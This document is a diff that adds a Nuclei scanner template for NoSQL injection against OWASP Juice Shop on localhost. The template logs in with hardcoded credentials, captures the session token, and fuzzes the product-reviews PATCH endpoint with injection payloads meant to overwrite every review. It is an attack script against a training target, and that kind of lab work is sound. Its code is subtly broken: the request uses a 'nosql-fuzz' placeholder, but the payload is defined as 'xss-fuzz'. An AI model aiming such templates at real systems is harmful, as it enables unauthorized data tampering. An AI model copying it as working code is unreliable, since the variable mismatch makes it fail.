@@ -1,0 +1,56 @@
+id: nosql_injection
+
+info:
+  name: NoSQL Injection in Juice Shop
+  author: your_name
+  severity: high
+  description: Attempting NoSQL Injection in product reviews.
+
+requests:
+  - raw:
+      - |
+        POST /rest/user/login HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+
+        {"email":"trycyber@gmail.com","password":"trycyber"}
+
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        group: 1
+        regex:
+          - '"token"\s*:\s*"([^"]+)"'
+
+  - raw:
+      - |
+        PATCH /rest/products/reviews HTTP/1.1
+        Host: 127.0.0.1:3000
+        Authorization: Bearer {{token}}
+        Cookie: language=en; token={{token}}
+        Content-Type: application/json
+
+        {"id":{{nosql-fuzz}},"message":"change_all_reviewsss\n"}
+        
+    
+    attack: Pitchfork
+    payloads:
+        xss-fuzz: /home/parrot/nuclei-templates/http/vulnerabilities/juice-shop/Injection/nosql-manipulation-fuzz.txt
+       
+    stop-at-first-match: true
+
+    matchers:
+          - type: status
+            status:
+              - 200
+
+          - type: word
+            words:
+              - "change_all_reviewsss"
+            part: body
+
+
+
